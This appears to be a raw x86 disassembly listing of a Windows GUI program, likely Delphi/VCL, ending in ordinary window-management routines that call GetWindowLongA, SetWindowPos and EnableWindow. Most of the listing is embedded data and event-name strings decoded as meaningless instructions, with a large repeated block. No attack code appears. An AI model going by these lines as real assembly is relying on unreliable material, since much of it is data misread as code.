popad
je r-xdata
mov al 0x78
movsb [ edi ] [ esi ]
rol [ ebx ] 0xc8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
inc ebx
insb
outsd
jae r-xdata
xor al 0xc0
inc ebx
add al al
dec edi
clc
mov ebp 0x1b00043
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
dec edi
outsb
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov al 0x78
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
rcr [ ebp + eax * 2 ] 0x98
add al [ eax ]
[ eax - 0x3b00fffe ]
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
hlt
jb r-xdata
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
inc esp
jae r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
outsb
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
push ecx
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xb06f666e
js r-xdata
outsb
outsw
mov al 0x78
inc ecx
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec eax
add [ edx ] cl
dec edi
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
or [ edx ] 0xa
dec edi
outsb
mov esi 0x1b80043
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
jbe r-xdata
jns r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc esp
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ebx
add al bl
add [ eax ] eax
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
dec ecx
outsb
inc esp
jb r-xdata
mov esp 0xf00043
add bh bh
[ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x58 ] bp
mov edi 0x1d00043
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esp
add [ 0x65476e4f ] cl
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
dec eax
imul esp [ ebp + 0x40 ] 0xa800455d
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
inc ebx
jb r-xdata
js r-xdata
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0xffffffffc4ff0002 ]
jo r-xdata
loopne r-xdata
jo r-xdata
mov ebx 0xd80043
add bh bh
fadd [ eax ]
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
inc esp
outsd
arpl [ ebx + 0x4f ] bp
or cl [ edi + 0x6e ]
outsb
inc esp
jb r-xdata
mov esp 0xe80043
add bh bh
call 0xffffffffc5446b49
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
dec ebp
add [ esi ] al
dec edi
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsb
inc ebx
outsd
outsb
jae r-xdata
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
js r-xdata
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
push edx
add [ ebx ] cl
dec edi
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
insb
add al dl
add al [ eax ]
call eax
outsd
jne r-xdata
push ebp
jo r-xdata
insb
mov esp 0x400043c1
inc esp
outsd
ja r-xdata
add al 0x5d
mov esp 0x480043c1
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
or [ ebx + 0xe00043 ] bh
add bh bh
js r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
outsb
rol [ ebx ] 0x38
add [ eax ] eax
jae r-xdata
push edi
cmp [ ebx + 0xd80043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
mov al 0x78
inc ecx
outsd
arpl [ ebx - 0x10 ] bp
mov esi 0x1f00043
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
ror [ esi + ebp * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffba91 ] al
outsd
inc ebp
add al bh
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xbf5c776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
js r-xdata
je r-xdata
jpe r-xdata
inc ebp
add [ eax + 0x34 ] bh
inc eax
add al ah
mov dl 0x45
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
mov es [ ebp ]
fdivr [ ebx + 0x44 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
add al 0x5d
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add al [ eax ]
add [ ebp + ebx * 2 + 0x2ac0045 ] bl
inc edx
add al al
mov [ ebp ] es
je r-xdata
sub [ edi + 0x45 ] 0x0
mov eax 0xf800456f
popad
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
inc eax
mov eax [ 0x452c0045 ]
inc esp
add [ esi + ebp * 4 ] al
inc ebp
add [ ecx + esi * 4 + 0x45 ] ah
add [ eax ] ah
mov al 0x45
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ edx + esi * 4 + 0x44280045 ] bl
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ edi + edx * 4 ] bh
inc ebp
add ah bl
jpo r-xdata
inc esp
mov al 0x42
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax - 0x53ffba47 ] dl
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ esi + ecx * 8 - 0x7bd7ffbb ] ah
inc ebp
add al bl
xchg [ ebp ] al
test [ edi - 0x703fffbb ] bh
inc ebp
add [ eax + edx * 4 ] bh
inc ebp
add [ edx + edx * 8 - 0x7307ffbb ] al
inc ebp
add [ eax + 0x680045cd ] cl
mov ah 0x45
add [ edi + ecx * 8 ] bh
inc ebp
add [ eax ] ah
0x90045 0x84
mov eax [ 0x42b02c00 ]
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
cwde
inc ebp
add [ ebx + ebp + 0x44 ] bl
add [ esi + eax + 0x44 ] dh
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ edx + ebx * 4 ] ah
inc ebp
add al dh
cwde
inc ebp
add [ eax ] bh
or [ eax + eax - 0x64 ] eax
0x2be00045 0x44
clc
add [ esp + edx * 4 + 0x45 ] cl
add [ eax - 0x59 ] al
inc ecx
add [ eax - 0x27 ] al
inc ebp
add al bl
nop
inc ebp
add ah ah
xchg ecx eax
inc ebp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edx + ebx * 4 + 0x45 ] bl
add [ edi + edi * 8 - 0x2a03ffbf ] ah
inc ebp
add ah dl
xlat
inc ebp
add al dh
jbe r-xdata
sub_4568f1
inc esp
add [ eax + 0x4596 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
je r-xdata
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
stosb [ edi ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jne r-xdata
jpe r-xdata
popad
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
push ecx
mov al 0x78
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
or dl dh
inc esp
add [ eax + 0x2 ] bl
add bh bh
adc al 0xa7
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
mov al 0x78
movsb [ edi ] [ esi ]
rol [ ebx ] 0xc8
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub eax [ edx ]
add bh bh
jo r-xdata
js r-xdata
dec edi
clc
mov ebp 0x1b00043
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
dec edi
outsb
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
mov al 0x78
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
jb r-xdata
outsb
push edx
jae r-xdata
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
hlt
jb r-xdata
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
inc ebx
insb
outsd
jae r-xdata
xor al 0xc0
inc ebx
add al al
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xb06f666e
js r-xdata
outsb
outsw
mov al 0x78
inc ecx
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec eax
add [ edx ] cl
dec edi
mov ebp 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
or [ edx ] 0xa
dec edi
outsb
mov esi 0x1b80043
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
jbe r-xdata
jns r-xdata
outsb
inc esp
jae r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
rcr [ ebp + eax * 2 ] 0x98
add al [ eax ]
[ eax - 0x3b00fffe ]
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ebx
add al bl
add [ eax ] eax
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
dec ecx
outsb
inc esp
jb r-xdata
mov esp 0xf00043
add bh bh
[ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x58 ] bp
mov edi 0x1d00043
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esp
add [ 0x65476e4f ] cl
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
dec eax
imul esp [ ebp + 0x40 ] 0xa800455d
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
inc ebx
jb r-xdata
js r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc esp
push eax
outsd
jo r-xdata
outsb
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
push ecx
loopne r-xdata
jo r-xdata
mov ebx 0xd80043
add bh bh
fadd [ eax ]
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xor [ ebx + eax * 2 + 0x1e000 ] bh
jmp eax
inc esp
outsd
arpl [ ebx + 0x4f ] bp
or cl [ edi + 0x6e ]
outsb
inc esp
jb r-xdata
mov esp 0xe80043
add bh bh
call 0xffffffffc5446b49
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0049 ] al
dec ebp
add [ esi ] al
dec edi
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
mov al [ 0xffffffffc4ff0002 ]
jo r-xdata
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
mov ebx 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
push edx
add [ ebx ] cl
dec edi
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
outsb
inc ebx
outsd
outsb
jae r-xdata
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
js r-xdata
outsd
jne r-xdata
push ebp
jo r-xdata
insb
mov esp 0x400043c1
inc esp
outsd
ja r-xdata
add al 0x5d
mov esp 0x480043c1
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
or [ ebx + 0xe00043 ] bh
add bh bh
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
insb
add al dl
add al [ eax ]
call eax
js r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
outsb
rol [ ebx ] 0x38
add [ eax ] eax
jae r-xdata
push edi
cmp [ ebx + 0xd80043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
mov al 0x78
inc ecx
outsd
arpl [ ebx - 0x10 ] bp
mov esi 0x1f00043
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
ror [ esi + ebp * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
outsd
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffba91 ] al
outsd
inc ebp
add al bh
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xbf5c776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
js r-xdata
je r-xdata
jpe r-xdata
inc ebp
add [ eax + 0x34 ] bh
inc eax
add al ah
mov dl 0x45
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
mov es [ ebp ]
fdivr [ ebx + 0x44 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
add al 0x5d
add [ eax - 0x4700fffe ] bh
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
add al [ eax ]
add [ ebp + ebx * 2 + 0x2ac0045 ] bl
inc edx
add al al
mov [ ebp ] es
je r-xdata
sub [ edi + 0x45 ] 0x0
mov eax 0xf800456f
popad
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
inc eax
mov eax [ 0x452c0045 ]
inc esp
add [ esi + ebp * 4 ] al
inc ebp
add [ ecx + esi * 4 + 0x45 ] ah
add [ eax ] ah
mov al 0x45
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ edx + esi * 4 + 0x44280045 ] bl
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ edi + edx * 4 ] bh
inc ebp
add ah bl
jpo r-xdata
inc esp
mov al 0x42
mov al 0x39
mov al 0xb
mov al 0xc5
add [ eax - 0x53ffba47 ] dl
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ esi + ecx * 8 - 0x7bd7ffbb ] ah
inc ebp
add al bl
xchg [ ebp ] al
test [ edi - 0x703fffbb ] bh
inc ebp
add [ eax + edx * 4 ] bh
inc ebp
add [ edx + edx * 8 - 0x7307ffbb ] al
inc ebp
add [ eax + 0x680045cd ] cl
mov ah 0x45
add [ edi + ecx * 8 ] bh
inc ebp
add [ eax ] ah
0x90045 0x84
mov eax [ 0x42b02c00 ]
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
cwde
inc ebp
add [ ebx + ebp + 0x44 ] bl
add [ esi + eax + 0x44 ] dh
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ edx + ebx * 4 ] ah
inc ebp
add al dh
cwde
inc ebp
add [ eax ] bh
or [ eax + eax - 0x64 ] eax
0x2be00045 0x44
clc
add [ esp + edx * 4 + 0x45 ] cl
add [ eax - 0x59 ] al
inc ecx
add [ eax - 0x27 ] al
inc ebp
add al bl
nop
inc ebp
add ah ah
xchg ecx eax
inc ebp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edx + ebx * 4 + 0x45 ] bl
add [ edi + edi * 8 - 0x2a03ffbf ] ah
inc ebp
add ah dl
xlat
inc ebp
add al dh
jbe r-xdata
sub_457074
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
inc eax
cmpsd [ esi ] [ edi ]
add [ ecx + esi * 2 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
jo r-xdata
les eax [ edx ]
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
rcr ah 0x45
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
or al 0x71
inc ebp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
mov esp 0x64004570
mov eax [ ecx ]
add al [ eax ]
add eax 0x6d726f46
jae r-xdata
add [ eax + 0x68000000 ] ah
mov al [ ecx ]
lodsb [ esi ]
add al [ edx ]
jo r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc ecx
add [ edi + edi * 8 - 0x1a7ffbf ] cl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] bl
fiadd [ ebp ]
and al 0xa8
inc ecx
add [ esi + edi * 8 - 0x58bfffbf ] dh
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x240045ef ] dl
test al 0x41
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
nop
xchg esp eax
jno r-xdata
add [ esi + edi * 8 - 0x58bfffbf ] dh
nop
out dx eax
inc ebp
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jno r-xdata
inc ecx
add [ edi + edi * 8 - 0x1a7ffbf ] cl
inc ecx
add [ edi + edi * 8 + 0x940041 ] bl
inc eax
cmpsd [ esi ] [ edi ]
add [ eax ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
jno r-xdata
les eax [ edx ]
inc edx
add [ edi + edi * 8 - 0x5bffbf ] ch
inc ecx
add ah cl
add al [ edx ]
movsb [ edi ] [ esi ]
in eax dx
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah cl
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
int3
add [ eax + 0x1 ] al
add [ eax ] al
push 0xac00418a
add al [ edx ]
jo r-xdata
inc edx
add ah al
add al [ edx ]
lodsb [ esi ]
inc [ ecx ]
movsb [ edi ] [ esi ]
inc [ ecx ]
int3
inc eax
add [ eax ] al
sub_457240
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_45728c
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460a34
mov eax [ rw-data ]
call sub_41fddc
mov eax [ rw-data ]
call sub_41fd84
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4572c4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_40278c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_457314
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
